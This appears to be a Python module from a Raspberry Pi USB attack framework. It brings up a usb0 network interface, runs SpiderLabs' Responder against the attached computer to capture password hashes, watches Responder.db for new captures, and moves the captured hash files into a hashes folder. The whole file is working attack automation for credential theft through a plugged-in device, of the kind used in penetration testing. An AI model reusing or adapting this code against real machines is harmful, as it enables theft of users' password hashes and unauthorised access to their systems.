import os
import sqlite3
import subprocess
import time

from components.framework.Debug import Debug
from components.framework.network import FwComponentNetwork
from components.helpers.ModuleManager import ModuleManager
from components.helpers.Color import Color

# TODO: Update Doc String and comments


class Responder(Debug):
    """ Class for Responder Module
                Args:
               functions:
                   capture              Run Spiderlabs' Responder on usb0 so password hashes can potentially
                                        be obtained.
                   network.up           Calls a method from the framework component "network.py" that enables usb0,
                                        configures the DHCP server and IP routing for network traffic
                                        capture.
                   monitor_responder    Monitors "Responder.db" for file changes and returns when either the "time
                                        to live" period has been reached or a password hash has been captured.
                   process.kill         Kills the instance of Responder that has been running.
                   network.down         Calls a method from the framework component "network.py" that disables usb0,
                                        the DHCP server and removes IP routing for the interface.
               Returns:
                   boolean
               Raises:
           """

    # Constructor
    def __init__(self, path, debug):
        super().__init__(debug=debug)
        self._type = "Module"
        self._name = "Responder"

        # All modules assumed to use it
        self.path = path
        self.responder = Debug(name="Responder", type="Module", debug=debug)

        if "aspbian" in subprocess.run("lsb_release -a", stdout=subprocess.PIPE, shell=True).stdout.decode():
            # If the "hashes" directory doesn't exist, create it
            if not os.path.exists("%s/modules/Responder/hashes" % self.path):
                subprocess.run("mkdir %s/modules/Responder/hashes" % self.path, shell=True)
                self.responder.debug("Creating hashes directory", color=Color.INFOBLUE)
            else:
                self.responder.debug("The hashes directory already exists, skipping creation!", color=Color.INFOBLUE)

        # Setup module manager
        self.module_manager = ModuleManager(debug=debug, save_needs_confirm=True)

        # import config data for this module
        self.current_config = self.module_manager.get_module_by_name(self._name)
        if not self.current_config:
            self.responder.debug("Error: could not import config of " + self._name, color=Color.FAIL)

        # Should not be global and should register debug state
        self.network = FwComponentNetwork(debug=debug)

        # Adapted from /src/utils.py. Creates and populates Responder.db correctly
        # (for some unknown reason Responder doesn't do this automatically)
        if not os.path.exists("%s/modules/Responder/src/Responder.db"%self.path):
            self.responder.debug("Creating Responder.db", color=Color.INFOBLUE)
            cursor = sqlite3.connect("%s/modules/Responder/src/Responder.db" % self.path)
            cursor.execute(
                'CREATE TABLE responder (timestamp varchar(32), module varchar(16), '
                'type varchar(16), client varchar(32), hostname varchar(32), user varchar(32), '
                'cleartext varchar(128), hash varchar(512), fullhash varchar(512))')
            cursor.commit()
            cursor.close()

    # Method used to capture password hashes from target using Spiderlabs' Responder
    def run(self):

        # Try convert the "ttl" that the user entered to a float
        try:
            # Grab Responder's "time to live" from the .ini
            time_to_live = float(self.current_config.options["ttl"])

        # If "ttl" cannot be converted to a float then set it to 60 seconds
        except Exception:
            time_to_live = 60
            self.responder.debug("Catch triggered! Setting 'ttl' to 60 seconds", color=Color.INFOBLUE)

        # If "ttl" < 60 seconds, set "ttl" to 60 seconds (the default value)
        if time_to_live < 60:
            time_to_live = 60
            self.responder.debug("'ttl' too low! Setting 'ttl' to 60 seconds", color=Color.INFOBLUE)

        def check_for_hashes(timestamp_old, timestamp_new):

            ##########################################################################################
            # This method uses code adapted from the Pi-Key project's 'picracking.py' in order to
            # monitor Responder's database for changes via file modification dates.

            # PiKey Created by Jon Aubrey (@SecurityJon) and Trevor Shingles (@_tshingles), 2017
            # This program is free software: you can redistribute it and/or modify it under
            # the terms of the GNU General Public License as published by the Free Software Foundation,
            # either version 3 of the License, or (at your option) any later version.
            # This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
            # without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
            # See the GNU General Public License for more details.

            # https://github.com/SecurityJon/PiKey
            # https://github.com/SecurityJon/PiKey/blob/master/client/picracking.py
            ##########################################################################################

            # Determine the last modified time of Responder.db

            if timestamp_new > timestamp_old:  # if newer modification time is detected, sleep and return
                time.sleep(2)
                self.responder.debug("Hash detected!", color=Color.INFOBLUE)
                return True
            else:
                self.responder.debug("No hash detected!", color=Color.INFOBLUE)
            return False

            # ~end of Pi-Key derived code~

        # Enable and disable g_ether (Required due to some unknown bug)
        subprocess.call("modprobe 'g_ether' '0x04b3' '0x4010'", shell=True)
        subprocess.run("modprobe -r g_ether", shell=True)

        time.sleep(1)  # Sleep required due to issues with modprobe usage with subprocess

        network_success = self.network.up()  # Up usb0

        if not network_success: # If networking.py has failed, don't run Responder and exit
            self.responder.debug("Exiting as networking.py has failed!", color=Color.FAIL)
            return False

        self.responder.debug("Responder starting", color=Color.OKGREEN)

        timestamp_before = os.stat("%s/modules/Responder/src/Responder.db" % self.path).st_mtime

        try:
            # Run Responder on usb0
            subprocess.run("exec python %s/modules/Responder/src/Responder.py -I usb0 "
                                   "-f - w - r - d - F"% self.path, shell=True, timeout=time_to_live)
        except Exception:
            pass

        self.responder.debug("Responder ended", color=Color.INFOBLUE)

        timestamp_after = os.stat("%s/modules/Responder/src/Responder.db" % self.path).st_mtime

        # Call the method that will determine if hashes have been captured
        hash_success = check_for_hashes(timestamp_before, timestamp_after)

        self.network.down()  # Down usb0

        # Move txt files that contain the hashes to a more central directory (hashes directory) if hashes were captured
        if hash_success:
            subprocess.run("find %s/modules/Responder/src/logs -name '*.txt' -exec mv {} %s/modules/Responder/hashes \;"
                           "" % (self.path, self.path), shell=True)

        return True